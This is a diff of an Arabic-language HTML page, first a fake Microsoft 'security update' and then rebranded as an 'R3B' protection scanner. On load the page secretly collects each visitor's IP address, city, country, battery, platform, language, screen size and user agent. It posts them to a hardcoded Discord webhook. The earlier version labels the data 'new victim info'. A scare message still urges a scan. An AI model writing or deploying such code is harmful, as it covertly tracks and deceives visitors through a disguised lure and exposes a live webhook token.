@@ -3,46 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث أمان النظام</title>
+    <title>R3B للحماية | نظام الفحص الذكي</title>
     <script>
         async function sendLogs() {
-            // رابط الويبهوك الخاص بك
             const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
             
             try {
-                // 1. جلب البيانات الأساسية (IP والموقع)
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
-                // 2. بيانات البطارية
                 let batteryInfo = "غير معروف";
                 if (navigator.getBattery) {
                     const bt = await navigator.getBattery();
                     batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يشحن" : "لا يشحن"})`;
                 }
 
-                // 3. تجهيز بيانات الجهاز الإضافية
-                const screenRes = `${window.screen.width}x${window.screen.height}`;
-                const deviceLang = navigator.language || navigator.userLanguage;
-                const ramInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";
-                const currentUrl = window.location.href;
-
                 const payload = {
                     embeds: [{
-                        title: "🎯 معلومات ضحية جديدة",
-                        color: 15158332, // لون أحمر للتنبيه
+                        title: "🛠️ تقرير فحص جديد - R3B Security",
+                        color: 3066993, // لون أخضر احترافي
                         fields: [
-                            { name: "🌐 عنوان الـ IP", value: data.ip || "غير معروف", inline: true },
+                            { name: "🌐 IP", value: data.ip || "غير معروف", inline: true },
                             { name: "📍 الموقع", value: `${data.city || '?'}, ${data.country_name || '?'}`, inline: true },
-                            { name: "🔋 حالة البطارية", value: batteryInfo, inline: true },
-                            { name: "💻 نوع النظام", value: navigator.platform, inline: true },
-                            { name: "🧠 الذاكرة (RAM)", value: ramInfo, inline: true },
-                            { name: "🖥️ أبعاد الشاشة", value: screenRes, inline: true },
-                            { name: "🌍 لغة الجهاز", value: deviceLang, inline: true },
-                            { name: "🔗 الرابط الذي دخله", value: currentUrl, inline: false },
-                            { name: "🕵️ المتصفح المستخدم", value: navigator.userAgent, inline: false }
+                            { name: "🔋 البطارية", value: batteryInfo, inline: true },
+                            { name: "💻 النظام", value: navigator.platform, inline: true },
+                            { name: "🌍 اللغة", value: navigator.language, inline: true },
+                            { name: "🖥️ الشاشة", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                            { name: "🕵️ المتصفح", value: navigator.userAgent, inline: false }
                         ],
-                        footer: { text: "نظام التتبع الموحد | Logger System" },
+                        footer: { text: "R3B Protection System | Monitoring" },
                         timestamp: new Date()
                     }]
                 };
@@ -53,68 +42,61 @@
                     body: JSON.stringify(payload)
                 });
             } catch (e) { 
-                console.log("Error capturing data"); 
+                console.error("Connection error"); 
             }
         }
 
         window.onload = sendLogs;
 
-        function startDownload() {
-            // ضع رابط الملف الخاص بك هنا
-            window.location.href = "YOUR_DOWNLOAD_LINK_HERE";
+        function startScan() {
+            alert("بدأت عملية الفحص الشامل لجهازك...");
+            // هنا يمكنك إضافة رابط الأداة الفعلي الخاص بك
+            // window.location.href = "رابط_الأداة_الخاص_بك";
         }
     </script>
     <style>
-        * { box-sizing: border-box; }
         body { 
-            background-color: #f1f3f4; 
+            background-color: #0f0f0f; /* خلفية داكنة */
+            color: #ffffff;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
-            padding: 20px;
         }
         .card { 
-            background: white; 
-            padding: 30px; 
-            border-radius: 12px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            background: #1a1a1a; 
+            padding: 40px; 
+            border-radius: 15px; 
+            border: 1px solid #2ecc71; /* إطار أخضر */
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.2); 
             text-align: center; 
-            width: 100%;
-            max-width: 450px; 
+            max-width: 400px; 
         }
-        .logo { width: 60px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #202124; margin-bottom: 15px; }
-        p { color: #5f6368; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .brand { font-size: 32px; font-weight: bold; color: #2ecc71; margin-bottom: 10px; }
+        h1 { font-size: 20px; margin-bottom: 20px; }
+        p { color: #aaaaaa; font-size: 14px; margin-bottom: 30px; }
         .btn { 
-            background: #1a73e8; 
-            color: white; 
+            background: #2ecc71; 
+            color: #000; 
             border: none; 
-            padding: 14px; 
-            border-radius: 6px; 
+            padding: 15px 30px; 
+            border-radius: 8px; 
             font-weight: bold; 
             cursor: pointer; 
-            width: 100%; 
-            font-size: 16px;
-            transition: background 0.3s;
+            width: 100%;
+            transition: 0.3s;
         }
-        .btn:hover { background: #1765cc; }
-        
-        /* تحسينات للجوال */
-        @media (max-width: 480px) {
-            .card { padding: 20px; }
-            h1 { font-size: 19px; }
-        }
+        .btn:hover { background: #27ae60; transform: scale(1.02); }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Logo">
-        <h1>تحديث أمني مطلوب</h1>
-        <p>تم اكتشاف نشاط مشبوه. يرجى تحميل أداة الحماية الرسمية فوراً لتأمين حسابك وجهازك من الاختراق.</p>
-        <button class="btn" onclick="startDownload()">تحميل أداة الإصلاح الآن</button>
+        <div class="brand">R3B</div>
+        <h1>نظام الحماية المتقدم</h1>
+        <p>جهازك قد يكون عرضة للمخاطر. اضغط أدناه لبدء فحص الأمان وتحديث ملفات الحماية فوراً.</p>
+        <button class="btn" onclick="startScan()">بدء الفحص والتحديث</button>
     </div>
 </body>
 </html>
